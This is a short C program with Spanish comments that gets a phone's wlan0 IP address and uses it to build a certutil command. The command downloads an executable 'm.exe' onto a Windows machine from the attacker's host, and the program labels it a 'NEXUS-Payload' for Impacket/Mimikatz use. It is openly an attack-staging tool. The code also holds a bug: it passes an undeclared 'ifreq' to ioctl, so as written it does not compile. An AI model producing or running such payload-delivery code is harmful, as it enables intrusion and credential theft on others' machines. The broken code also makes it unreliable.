#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <netinet/in.h>
#include <net/if.h>
#include <unistd.h>
#include <arpa/inet.h>

char* get_interface_ip(const char* iface) {
    int fd;
    struct ifreq ifr;
    static char ip_address[16];

    fd = socket(AF_INET, SOCK_DGRAM, 0);

    // Tipo de dirección que queremos (IPv4)
    ifr.ifr_addr.sa_family = AF_INET;

    // Copiamos el nombre de la interfaz (wlan0, tun0, etc.)
    strncpy(ifr.ifr_name, iface, IFNAMSIZ-1);

    // Llamada al IOCTL para obtener la dirección IP
    if (ioctl(fd, SIOCGIFADDR, &ifreq) == 0) {
        strcpy(ip_address, inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr));
    } else {
        close(fd);
        return NULL;
    }

    close(fd);
    return ip_address;
}

int main() {
    // En el Moto E15, la interfaz suele ser wlan0
    char* my_ip = get_interface_ip("wlan0");

    if (my_ip) {
        printf("[+] Interfaz Detectada: %s\n", my_ip);
        printf("[*] Configurando NEXUS-Payload con IP: %s\n", my_ip);
        
        // Aquí puedes usar sprintf para construir tus comandos de Impacket/Mimikatz
        char command[256];
        sprintf(command, "C:\\Windows\\System32\\certutil.exe -urlcache -f http://%s:9090/m.exe m.exe", my_ip);
        printf("[>] Comando generado: %s\n", command);
    } else {
        printf("[-] Error: No se pudo obtener la IP. ¿La interfaz está activa?\n");
    }

    return 0;
}
